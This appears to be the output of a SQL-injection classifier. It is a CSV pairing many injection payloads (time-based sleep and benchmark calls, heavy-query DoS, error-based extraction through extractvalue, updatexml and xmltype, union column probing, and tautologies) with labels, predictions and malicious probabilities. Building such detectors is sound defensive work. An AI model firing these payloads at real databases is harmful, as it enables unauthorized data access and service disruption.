Query,Label,predicted,correct,malicious_probability
"1  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  2160  =  2160",1,1,True,0.9724684094597602
"1""   )    )    as jsdc where 2748  =  2748",1,1,True,0.9592207003732345
"-9507%"" union all select 3342,3342,3342,3342,3342#",1,1,True,0.9580208975814412
1  )   where 9708  =  9708,1,1,True,0.9623764092443791
"1%"" and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""%""  =  """,1,1,True,0.8201016461557417
"-9119""  )   where 9237  =  9237 or 8571  =  8571--",1,1,True,0.9892796382070854
"1'   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   'dhwt'  =  'dhwt",1,1,True,0.9773312246901042
"1%""   )    )     )   or sleep  (  5  )  #",1,1,True,0.9985042951522106
"1%' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and '%'  =  '",1,1,True,0.9945162044040632
"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'aicu'  =  'aicu",1,1,True,0.9859530309479084
"1""  )   where 9511  =  9511   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",1,1,True,0.9860428415268703
"1  )   as iuje where 1976  =  1976 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,1,True,0.9811114863330338
1'  )   as eyzk where 2489  =  2489 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1,1,True,0.9805673252421404
"1%""   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,1,True,0.9949487554261713
select   (  case when   (  1961  =  2048  )   then 1961 else 1961*  (  select 1961 from information_schema.character_sets  )   end  )  #,1,1,True,0.9959808378850802
1'||  (  select 'iuud' where 3687  =  3687,1,1,True,0.9821713090397234
1   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  3332  =  3332,1,1,True,0.9925051051306121
"-9361""   )    )    union all select 3112#",1,1,True,0.88364480941109
"1""   )    )    union all select null,null,null--",1,1,True,0.9742734010082317
"1' union all select null,null,null,null,null,null,null,null,null,null#",1,1,True,0.9711365106960225
"-8709"" or 8571  =  8571--",1,1,True,0.9963828206335863
"select count  (  *  )   from generate_series  (  1,5000000  )  -- gqkk",1,1,True,0.9981786264244746
"1   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   5683  =  5683",1,1,True,0.935001381846333
"-2325'   )    )     )   union all select 1442,1442,1442--",1,1,True,0.9868476639306314
"1""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""wile"" like ""wile",1,1,True,0.9821018376705382
"1',  (  select 9100  =    (  'qqpjq'||  (  select case 9100 when 9100 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   ",1,1,True,0.9973058314578541
"-9379  )   or make_set  (  9354  =  9354,7185  )   and   (  9212  =  9212",1,1,True,0.9268607784115941
"1%""   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,1,True,0.985143578155169
1%' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and '%'  =  ',1,1,True,0.9887763570624858
"1   )    )    as cvid where 4381  =  4381 union all select null,null--",1,1,True,0.9641404967102374
"1'||  (  select 'scwx' where 6591  =  6591 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )     )  ||'",1,1,True,0.9965346027902069
"1' in boolean mode  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1,True,0.9943927366275013
select   (  case when   (  3565  =  4053  )   then 3565 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,1,True,0.9860221200307872
1 where 4091  =  4091,1,1,True,0.9518831012174586
"-9864""  )   or elt  (  5885  =  4936,4936  )   and   (  ""bfbb"" like ""bfbb",1,1,True,0.9094020473060975
1'  )   as fkpn where 1100  =  1100,1,1,True,0.9943630171240467
"1'+  (  select zbyt where 4575  =  4575 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x   )    )   +'",1,1,True,0.9537876301115172
"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",1,1,True,0.9876487333678579
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""uidb"" like ""uidb",1,1,True,0.7772644395723971
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'nczi'  =  'nczi",1,1,True,0.9922856563119172
"1%"" or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and ""%""  =  """,1,1,True,0.978670357015149
"1 where 1656  =  1656 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,True,0.9825870732754685
"1%' or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,1,True,0.9900962854433157
"1'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'gmvk' like 'gmvk",1,1,True,0.9779205454507016
"1%"" union all select null,null,null,null#",1,1,True,0.8981802285151262
select   (  case when   (  5856  =  7176  )   then 5856 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,1,True,0.9855027749941425
"1  )   union all select null,null,null,null,null,null,null--",1,1,True,0.9811330397495217
"-9638   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  3679  =  3679",1,1,True,0.9571485654814301
1'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'vnfi'  =  'vnfi,1,1,True,0.9700436254716281
"1""   )    )    as lslk where 6729  =  6729 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,True,0.9934497609514356
1   )    )    rlike sleep  (  5  )  #,1,1,True,0.9987447734643674
"1""   )    )    as rrms where 8185  =  8185 union all select null,null,null,null,null,null,null,null--",1,1,True,0.965523405008617
1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,1,True,0.9985369931249403
"1%""   )    )     )   and 2006  =  2006",1,1,True,0.9625236097946311
select   (  case when   (  3677  =  2193  )   then 3677 else 1/  (  select 0  )   end  )  --,1,1,True,0.9839290071825676
"1'  )   where 6328  =  6328 union all select null,null,null,null,null,null,null,null,null#",1,1,True,0.9639769146607122
select   (  case when   (  2501  =  4688  )   then 2501 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,1,True,0.9860107882918332
1   )    )    as bvij where 7913  =  7913,1,1,True,0.964334276667973
"1%"" union all select null,null,null,null,null--",1,1,True,0.9735550052894588
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'cixa' like 'cixa",1,1,True,0.9797721831046462
"1""  )   as ufai where 9673  =  9673",1,1,True,0.9387225787719159
"1"" where 2072  =  2072 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,1,True,0.9819408979423764
"-8203   )    )    as eqlf where 6132  =  6132 union all select 6132,6132,6132,6132,6132,6132,6132,6132,6132--",1,1,True,0.9672778030041704
1   )    )    as pxmz where 2596  =  2596,1,1,True,0.9625614076011775
"1'   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,True,0.965391727879176
"1',  (  select   (  case when   (  5586  =  6403  )   then 1 else 5586*  (  select 5586 from mysql.db  )   end   )    )   ",1,1,True,0.9701037214422944
-6039%'   )    )    or 6872  =  6872 and    (    (   '%'  =  ',1,1,True,0.97557546670638
"1""  )   as yzny where 4869  =  4869 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --",1,1,True,0.9966352845237447
1  )   where 1487  =  1487,1,1,True,0.9737866963496878
1'||  (  select 'abjv' from dual where 4200  =  4200,1,1,True,0.9933738474918303
"1%""   )    )     )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,1,True,0.9862900672888527
"select * from generate_series  (  6730,6730,case when   (  6730  =  9431  )   then 1 else 0 end  )   limit 1--",1,1,True,0.9950885365990143
"1'+  (  select immd where 7499  =  7499 union all select null,null,null,null,null,null,null,null#",1,1,True,0.9390080415739419
"1 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1,1,True,0.9412114342320641
1'  )   where 8128  =  8128,1,1,True,0.9853815047849157
"-1333""   )    )    union all select 2376,2376,2376,2376,2376,2376,2376,2376,2376--",1,1,True,0.9500464383320928
1  )   as ktfu where 2637  =  2637,1,1,True,0.9590714934049703
1'+  (  select nash where 4159  =  4159 union all select null#,1,1,True,0.9138970873407045
"1%""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  ""%""  =  """,1,1,True,0.9937223505195137
"-8143 union all select 4492,4492,4492,4492,4492,4492,4492,4492,4492#",1,1,True,0.9429487311092563
"-9762  )   or elt  (  5773  =  8986,8986  )  ",1,1,True,0.9255610020051629
"1%' or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,True,0.9927629534358402
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'fnna'  =  'fnna",1,1,True,0.9803507527848984
select   (  case when   (  7822  =  4430  )   then 7822 else 1/  (  select 0  )   end  )  --,1,1,True,0.9820340594869693
"1'  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  ",1,1,True,0.9948878090536829
"-9630%"" union all select 8592,8592,8592,8592--",1,1,True,0.9705606923039397
"1 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",1,1,True,0.83363518685381
"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""rtyu"" like ""rtyu",1,1,True,0.9032550455717797
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  '%'  =  '",1,1,True,0.9746458046535956
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and '%'  =  ',1,1,True,0.9964656655648964
"-3209'+  (  select ldum where 9912  =  9912 union all select 9912,9912,9912,9912#",1,1,True,0.9177148764361281
-8233' or 9538  =  1882#,1,1,True,0.9601240228324895
"-7125"" or   (  8919  =  2275  )  *2275 and ""fbwo""  =  ""fbwo",1,1,True,0.9627113928779998
"-4756""   )    )    union all select 6846,6846,6846,6846,6846,6846,6846#",1,1,True,0.888550593240828
1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  'uzmy' like 'uzmy,1,1,True,0.9973920874006728
"1""   )    )    as upvg where 4826  =  4826",1,1,True,0.9225846009735227
1   )    )    as klmm where 3107  =  3107,1,1,True,0.9817725722632071
1'||  (  select 'ptfi' from dual where 2234  =  2234 and 2006  =  2006,1,1,True,0.9848725632003876
"1  )   where 8474  =  8474 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,True,0.9813120538914477
"-4413%'   )    )    union all select 1345,1345#",1,1,True,0.9500676479852915
"1%""   )    )     )   and 1594  =  8757",1,1,True,0.9699028848510446
"1""   )    )    union all select null,null,null,null,null,null,null,null,null,null--",1,1,True,0.9704916988559924
"1',  (  case when 3598  =  2118 then 1 else null end  )  ",1,1,True,0.9344886391540393
"-1004"" where 6266  =  6266 order by 1#",1,1,True,0.9424448497414213
"-7043""  )   where 9755  =  9755 union all select 9755,9755,9755,9755,9755,9755#",1,1,True,0.9097554192383236
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""%""  =  """,1,1,True,0.7729922347895504
1'  )   as ghvi where 3880  =  3880 and 4595  =  4595#,1,1,True,0.9762062319094416
1'||  (  select 'idna' from dual where 2683  =  2683 rlike   (  select   (  case when   (  3201  =  9748  )   then 1 else 0x28 end   )    )     )  ||',1,1,True,0.9887060480964374
"1   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   8048  =  8048",1,1,True,0.934643003938262
"1""   )    )    as hbfi where 4773  =  4773 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,1,True,0.9815079584398959
-7435'  )   where 6242  =  6242 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1,1,True,0.972217111935799
1'+  (  select 'mzee' where 5984  =  5984,1,1,True,0.9776813882890226
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""kndm""  =  ""kndm",1,1,True,0.9947158707761736
"1   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,1,True,0.9959673440552809
"1"" where 7696  =  7696 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",1,1,True,0.9904690446674135
"1   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   3102  =  3102",1,1,True,0.9129591085566042
"-9718%""  )   union all select 9515,9515,9515#",1,1,True,0.8695423262789133
1 where 8966  =  8966,1,1,True,0.9664867732787839
1'||  (  select 'yhpe' where 8010  =  8010 rlike   (  select   (  case when   (  7910  =  3752  )   then 1 else 0x28 end   )    )     )  ||',1,1,True,0.9854612715163414
"1"" where 3018  =  3018 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1,1,True,0.9745232820986746
1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and 'vnkr' like 'vnkr,1,1,True,0.9975991692074082
"-1802%'   )    )    union all select 1002,1002,1002,1002,1002,1002,1002#",1,1,True,0.9799395793153497
1  )   where 8616  =  8616 and 2006  =  2006,1,1,True,0.9693133545686803
"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'esjl'  =  'esjl",1,1,True,0.9828217898347708
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'nslo' like 'nslo",1,1,True,0.9928132137290864
1 and 9122  =  4153# nxcv,1,1,True,0.9682924958803838
"-8819""  )   where 9119  =  9119 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,1,True,0.9761040843283457
"-1687   )    )    as lnva where 8396  =  8396 union all select 8396,8396#",1,1,True,0.9223063761734906
"1%""   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  ""%""  =  """,1,1,True,0.9976987765389987
1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,1,1,True,0.9995167418022693
"1%"" or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,True,0.9281638071662573
-2920'   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'rzey'  =  'rzey,1,1,True,0.979675253499027
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  9348  =  9348",1,1,True,0.9514207494419504
"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",1,1,True,0.9956325921052286
"1'+  (  select tvpj where 7058  =  7058 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  +'",1,1,True,0.9853660592319708
"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""phcl"" like ""phcl",1,1,True,0.9815562640385076
"1"" and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and ""cecf""  =  ""cecf",1,1,True,0.9813980218885137
-7552 or 6872  =  6872,1,1,True,0.9269064424910084
1   )    )    as jvoo where 5116  =  5116 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,1,True,0.9990959630068954
1'  )   as wtev where 5283  =  5283,1,1,True,0.9846516625039874
1 where 5359  =  5359 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1,1,True,0.976002865161874
"1'+  (  select qymy where 8657  =  8657 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,True,0.9931392089728307
1' where 6533  =  6533,1,1,True,0.9880625060453372
"1""  )   as mwja where 7881  =  7881 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",1,1,True,0.9685268014609901
"1'||  (  select 'fraa' from dual where 9140  =  9140 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x   )    )   ||'",1,1,True,0.9757868337520086
"1'  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'csmu'  =  'csmu",1,1,True,0.9893880430081453
"1""  )   where 4172  =  4172 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",1,1,True,0.9938948469745585
"1   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  3036  =  3036",1,1,True,0.95145533137131
"1""   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""kldp"" like ""kldp",1,1,True,0.8152163122340446
"1""  )   as uorp where 7208  =  7208",1,1,True,0.9395957499539791
"1%'   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   '%'  =  '",1,1,True,0.9824854550707651
"1""  )   as cnrh where 8524  =  8524 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1,1,True,0.9958145299874314
1 or sleep  (  5  )  -- nrzf,1,1,True,0.9999845370301708
"-2296"" union all select 7359,7359,7359,7359,7359,7359#",1,1,True,0.8828257094107212
"-8106%""  )   union all select 2051,2051,2051,2051,2051,2051#",1,1,True,0.9727754446508673
"1""  )   as bllz where 6975  =  6975 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,True,0.9955717319028675
"-6970""   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""dyrq"" like ""dyrq",1,1,True,0.9534370548095351
"1' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and 'cotv' like 'cotv",1,1,True,0.9932801720125439
select   (  case when   (  5085  =  4259  )   then 5085 else 5085*  (  select 5085 from mysql.db  )   end  )  #,1,1,True,0.9616331695317872
select sleep  (  5  )   and '%'  =  ',1,1,True,0.995294875397749
-2992%'   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  '%'  =  ',1,1,True,0.9562487171519032
1'||  (  select 'zoqo' from dual where 2063  =  2063,1,1,True,0.9873913212441299
"-5275%'   )    )    union all select 9382,9382,9382,9382,9382,9382,9382,9382,9382,9382--",1,1,True,0.9736787822347457
"1"" where 9342  =  9342 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",1,1,True,0.9980080168748505
1'   )    )     )   and sleep  (  5  )   and    (    (     (  'lbmp'  =  'lbmp,1,1,True,0.996637097592738
"1 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  # dbzk",1,1,True,0.9871225525911027
"1""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1,1,True,0.9965992465950729
1'   )    )    and 9198  =  9198--,1,1,True,0.9958972436985184
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'  =  'qjle",1,1,True,0.9929664966840905
1   )    )    as iihk where 5414  =  5414 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1,1,True,0.9858831196306658
end and    (    (     (  'xzbk'  =  'xzbk,1,1,True,0.9951333326279572
-4171'  )   union all select 6136#,1,1,True,0.9645554494692737
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   #",1,1,True,0.9961849254630429
1'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   'qtul' like 'qtul,1,1,True,0.989983905544476
"  (  extractvalue  (  1759,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1759  =  1759,1   )    )     )  ,0x717a767a71   )    )     )  ",1,1,True,0.9466003492360682
"-5738""  )   as efbn where 8541  =  8541 union all select 8541,8541,8541,8541,8541,8541,8541,8541#",1,1,True,0.9477281833950154
1%'   )    )     )   or sleep  (  5  )  #,1,1,True,0.9989261508291295
